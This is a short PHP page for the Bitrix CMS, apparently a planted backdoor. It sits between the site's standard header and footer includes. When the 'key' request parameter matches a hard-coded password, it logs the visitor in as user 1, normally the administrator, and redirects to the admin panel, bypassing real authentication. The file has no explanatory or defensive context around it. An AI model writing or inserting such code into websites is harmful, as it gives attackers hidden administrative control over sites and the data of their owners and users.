<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");


$key = $_REQUEST['key'];

if ($key == '1q2w3e4r5T!') {
    $USER->Authorize(1);
    LocalRedirect('/bitrix/');
    exit;
}

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");

?>